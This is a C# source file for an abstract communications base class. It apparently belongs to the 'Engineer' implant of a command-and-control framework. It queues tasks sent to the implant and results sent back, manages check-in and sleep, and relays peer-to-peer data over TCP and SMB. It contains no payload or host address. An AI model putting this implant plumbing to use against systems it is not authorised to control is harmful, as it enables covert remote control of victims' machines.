﻿using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;
using Engineer.Functions;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TrackBar;

namespace Engineer.Models
{
    public abstract class EngCommBase
	{
		public abstract Task Start();
		public abstract void Stop();

		public abstract Task CheckIn();

		public abstract Task PostData();

		internal ConcurrentQueue<EngineerTask> Inbound = new ConcurrentQueue<EngineerTask>();
		internal ConcurrentQueue<EngineerTaskResult> Outbound = new ConcurrentQueue<EngineerTaskResult>();
        internal ConcurrentQueue<byte[]> P2POutbound = new ConcurrentQueue<byte[]>();
        internal EngineerMetadata engineerMetadata;

        public bool IsChildConnectedToParent { get; set; } // only used from a child in TCP & SMB, is true if its parent is still connected, false if not, used to issue check-in commands.
        public static int Sleep { get; set;}
		internal IEnumerable<EngineerTaskResult> GetOutbound()
		{
			var outbound = new List<EngineerTaskResult>();
			while (Outbound.TryDequeue(out var task))
			{
				outbound.Add(task);
            }
			//Console.WriteLine($"{DateTime.Now} removed {outbound.Count} tasks from queue");
			return outbound;
		}

        internal List<byte[]> GetP2POutbound()
        {
	        var P2POutboundList = new List<byte[]>();
	        while(P2POutbound.TryDequeue(out var tcpTaskData))
	        {
		        P2POutboundList.Add(tcpTaskData);
	        }
	        return P2POutboundList;
        }

        public bool RecvData(out IEnumerable<EngineerTask> tasks)
		{
			if (Inbound.IsEmpty)
			{
				tasks = null;
                return false;
			}
			var list = new List<EngineerTask>();

			while (Inbound.TryDequeue(out var task))
			{
				list.Add(task);
			}

			tasks = list;
			return true;

		}

        public async Task CheckForDataProcess()
        {
            var list = new List<EngineerTask>();
            while (Inbound.TryDequeue(out var task))
            {
                list.Add(task);
            }
            Tasking.DealWithTasks(list);
        }

        public void SentData(EngineerTaskResult result, bool isDataChunked)
		{
			var newResult = new EngineerTaskResult
            {
                Id = result.Id,
                Command = result.Command,
                Result = result.Result,
                IsHidden = result.IsHidden,
                Status = result.Status,
                ImplantId = result.ImplantId,
                ResponseType = result.ResponseType,
            };
            if (isDataChunked)
            {
				Outbound.Enqueue(newResult);
				return;
            }
            //if the result is already in the Outbound queue then append the result to the existing result and update the status
            if (Outbound.Any(t => t.Id == newResult.Id))
			{
				var existingResult = Outbound.FirstOrDefault(t => t.Id == newResult.Id);
				existingResult.Result = existingResult.Result.Concat(newResult.Result).ToArray();
				existingResult.Status = newResult.Status;
			}
			else
			{
				Outbound.Enqueue(newResult);
			}
        }

        public async Task P2PSent(byte[] tcpData)
		{
            P2POutbound.Enqueue(tcpData);
			//Console.WriteLine($"{DateTime.Now} task response in queue size {tcpData.Length}");
        }

		public virtual void Init(EngineerMetadata engineermetadata)
		{
			engineerMetadata = engineermetadata;

		}
	}
}
